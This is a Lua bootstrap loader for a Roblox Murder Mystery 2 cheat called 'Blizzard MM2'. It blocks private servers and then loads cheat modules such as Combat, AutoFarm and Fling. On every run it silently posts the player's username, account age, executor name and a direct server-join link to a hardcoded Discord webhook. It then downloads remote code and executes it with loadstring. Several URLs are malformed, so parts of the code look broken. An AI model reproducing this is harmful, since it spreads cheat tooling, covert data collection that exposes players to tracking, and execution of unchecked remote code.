--============================================================
-- Blizzard MM2 V8.8.4 - MASTER BOOTSTRAP LOADER
-- Protected multi-file loader with clear error reporting.
--============================================================

--============================================================
-- PRIVATE SERVER ACCESS BLOCK
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local LocalPlayer =
	Players.LocalPlayer

local PrivateServerId =
	tostring(
		game.PrivateServerId
		or ""
	)

local PrivateServerOwnerId =
	tonumber(
		game.PrivateServerOwnerId
	)
	or 0

local MM2VIPServer =
	ReplicatedStorage:GetAttribute(
		"IsVIPServer"
	) == true

local IsPrivateServer =
	MM2VIPServer
	or PrivateServerId ~= ""
	or PrivateServerOwnerId ~= 0

if IsPrivateServer then

	warn(
		"[MM2 LOADER] Private server detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"Private servers are prohibited. Repeated offenses may result in a permanent ban."
	)

	return
end

--============================================================
-- STARTUP & WEBHOOK NOTIFICATION
--============================================================

print(
	"[MM2 LOADER] Starting Blizzard MM2 V8.8.4..."
)

-- Webhook Execution Logger
local httpRequest = request or http_request or (syn and syn.request)
if httpRequest then
	local HttpService = game:GetService("HttpService")
	
	-- PASTE YOUR COMPLETE RAW DISCORD WEBHOOK URL HERE
	local webhookUrl = "https://discord.com/api/webhooks/1548529603658653769/U65oFiT9Qmt1n-pw-XvAUQVmFqqB8LGanAnImk35gzcDIoQC4XAnPrVBTkq1lk8xtJye"

	-- Dynamically detect the Executor being used
	local executorName = "Unknown Executor"
	if identifyexecutor then
		pcall(function() executorName = identifyexecutor() end)
	elseif getexecutorname then
		pcall(function() executorName = getexecutorname() end)
	elseif checkclosure then
		executorName = "Solara / Similar"
	end

	task.spawn(function()
		local success, responseOrErr = pcall(function()
			return httpRequest({
				Url = webhookUrl,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = HttpService:JSONEncode({
					["embeds"] = {{
						["title"] = "Blizzard MM2 Executed! 🚀",
						["color"] = 3447003, -- Blue theme color
						["fields"] = {
							{["name"] = "Player Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
							{["name"] = "Account Age (Days)", ["value"] = tostring(LocalPlayer.AccountAge), ["inline"] = true},
							{["name"] = "Executor Software", ["value"] = tostring(executorName), ["inline"] = true},
							{["name"] = "Game Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = false},
							{["name"] = "Direct Link", ["value"] = "[Click to View Game](https://roblox.com" .. tostring(game.PlaceId) .. ")", ["inline"] = true},
							{["name"] = "Direct Server Join Link", ["value"] = "<roblox-player:1+launchmode:play+gameinfo:" .. tostring(game.JobId) .. "+placeid:" .. tostring(game.PlaceId) .. ">", ["inline"] = false}
						},
						["timestamp"] = DateTime.now():ToIsoDate()
					}}
				})
			})
		end)
		
		if not success then
			warn("[MM2 LOADER] Webhook script failed to execute: " .. tostring(responseOrErr))
		elseif responseOrErr and responseOrErr.StatusCode and responseOrErr.StatusCode ~= 204 and responseOrErr.StatusCode ~= 200 then
			warn("[MM2 LOADER] Discord API rejected payload. Status Code: " .. tostring(responseOrErr.StatusCode) .. " | Body: " .. tostring(responseOrErr.Body))
		end
	end)
end

--============================================================
-- BASE URL
--============================================================

local BaseURL =
	"https://githubusercontent.com"

--============================================================
-- CLEAN UP OLD INSTANCE
--============================================================

local ExistingMM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if ExistingMM2
	and ExistingMM2.Cleanup
then

	print(
		"[MM2 LOADER] Cleaning previous instance..."
	)

	pcall(function()

		ExistingMM2.Cleanup()

	end)

	task.wait(0.3)
end

--============================================================
-- MODULE LOADER
--============================================================

local function LoadModule(
	fileName
)

	local targetURL =
		BaseURL
		.. fileName

	print(
		"[MM2 LOADER] Loading: "
		.. fileName
	)

	--========================================================
	-- DOWNLOAD
	--========================================================

	local downloadOk,
	scriptContent =
		pcall(function()

			return game:HttpGet(
				targetURL
			)

		end)

	if not downloadOk then

		warn(
			"[MM2 LOADER] DOWNLOAD ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				scriptContent
			)
		)

		return false
	end

	if not scriptContent
		or scriptContent == ""
		or scriptContent == "404: Not Found"
	then

		warn(
			"[MM2 LOADER] INVALID/EMPTY FILE: "
			.. fileName
		)

		return false
	end

	--========================================================
	-- COMPILE
	--========================================================

	local fn,
	compileError =
		loadstring(
			scriptContent
		)

	if not fn then

		warn(
			"[MM2 LOADER] COMPILE ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				compileError
			)
		)

		return false
	end

	--========================================================
	-- EXECUTE
	--========================================================

	local runOk,
	runResult =
		pcall(
			fn
		)

	if not runOk then

		warn(
			"[MM2 LOADER] RUNTIME ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				runResult
			)
		)

		return false
	end

	print(
		"[MM2 LOADER] Successfully loaded: "
		.. fileName
	)

	return true
end

--============================================================
-- SAFE LOAD HELPER
--============================================================

local function RequireModule(
	fileName
)

	local success =
		LoadModule(
			fileName
		)

	if not success then

		warn(
			"[MM2 LOADER] Bootstrap stopped because "
			.. fileName
			.. " failed to load."
		)

		return false
	end

	return true
end

--============================================================
-- LOAD ORDER
--============================================================

if not RequireModule(
	"Shared.lua"
) then
	return
end

if not RequireModule(
	"UI.lua"
) then
	return
end

if not RequireModule(
	"Visuals.lua"
) then
	return
end

if not RequireModule(
	"Combat.lua"
) then
	return
end

if not RequireModule(
	"AutoFarm.lua"
) then
	return
end

if not RequireModule(
	"Player.lua"
) then
	return
end

if not RequireModule(
	"Fling.lua"
) then
	return
end

if not RequireModule(
	"Misc.lua"
) then
	return
end

if not RequireModule(
	"SkinChanger.lua"
) then
	return
end

if not RequireModule(
	"Main.lua"
) then
	return
end

--============================================================
-- FINAL STATUS
--============================================================

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if MM2
	and MM2.Running
then

	print(
		"[MM2 LOADER] Blizzard MM2 V8.8.4 bootstrap COMPLETE."
	)

else

	warn(
		"[MM2 LOADER] Bootstrap finished, but MM2 runtime was not detected."
	)
end
